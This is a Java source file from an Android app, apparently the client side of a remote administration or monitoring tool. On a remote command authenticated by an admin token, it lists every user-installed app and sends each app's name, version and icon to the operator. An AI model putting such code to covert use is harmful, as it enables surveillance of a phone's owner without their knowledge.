package com.user.side.sessions;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.util.Base64;


import com.user.side.constants.Actions;
import com.user.side.constants.Constants;
import com.user.side.listeners.OnRequestSendMessageListener;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.util.List;

public class InstalledAppsSession extends Session{
    public InstalledAppsSession(Context context, String adminToken, OnRequestSendMessageListener onRequestSendMessageListener, int id) {
        super(context, adminToken, onRequestSendMessageListener, id);
    }

    @Override
    public void onMessageReceived(String message) {
        super.onMessageReceived(message);
        try {
            handleMessage(message);
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }
    }

    private void handleMessage(String message) throws JSONException {
        JSONObject jsonObject = new JSONObject(message);

        String action = jsonObject.getString(Constants.ACTION_KEY);

        switch (action) {
            case Actions.ACTION_REQUEST_GET_INSTALLED_APPS:
                sendInstalledApps();
                break;
        }
    }

    private void sendInstalledApps() throws JSONException {
        List<ApplicationInfo> installedApps = context.getPackageManager().getInstalledApplications(PackageManager.GET_META_DATA);

        for (ApplicationInfo installedApp : installedApps) {
            if(((installedApp.flags & ApplicationInfo.FLAG_SYSTEM) != 0))continue;

            String packageName = installedApp.packageName;

            PackageInfo packageInfo = null;
            try {
               packageInfo = context.getPackageManager().getPackageInfo(packageName, 0);
            } catch (PackageManager.NameNotFoundException e) {}

            String appName = installedApp.loadLabel(context.getPackageManager()).toString();
            String version = packageInfo == null || packageInfo.versionName == null ? "?" : packageInfo.versionName;
            Bitmap icon = drawableToBitmap(installedApp.loadIcon(context.getPackageManager()));

            sendInstalledApp(packageName, appName, version, icon);
        }

    }

    public static Bitmap drawableToBitmap (Drawable drawable) {
        Bitmap bitmap = null;

        if (drawable instanceof BitmapDrawable) {
            BitmapDrawable bitmapDrawable = (BitmapDrawable) drawable;
            if(bitmapDrawable.getBitmap() != null) {
                return bitmapDrawable.getBitmap();
            }
        }

        if(drawable.getIntrinsicWidth() <= 0 || drawable.getIntrinsicHeight() <= 0) {
            bitmap = Bitmap.createBitmap(1, 1, Bitmap.Config.ARGB_8888); // Single color bitmap will be created of 1x1 pixel
        } else {
            bitmap = Bitmap.createBitmap(drawable.getIntrinsicWidth(), drawable.getIntrinsicHeight(), Bitmap.Config.ARGB_8888);
        }

        Canvas canvas = new Canvas(bitmap);
        drawable.setBounds(0, 0, canvas.getWidth(), canvas.getHeight());
        drawable.draw(canvas);
        return bitmap;
    }
    private void sendInstalledApp(String packageName, String appName, String version, Bitmap icon) throws JSONException {
        JSONObject jsonObject = new JSONObject();

        jsonObject.put(Constants.ACTION_KEY, Actions.ACTION_RECEIVE_INSTALLED_APP);
        jsonObject.put("package", packageName);
        jsonObject.put("name", appName);
        jsonObject.put("version", version);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        icon.compress(Bitmap.CompressFormat.PNG, 100, byteArrayOutputStream);
        byte[] byteArray = byteArrayOutputStream .toByteArray();

        String encoded = Base64.encodeToString(byteArray, Base64.DEFAULT);

        jsonObject.put("icon", encoded);

        sendMessage(jsonObject.toString());
    }
}
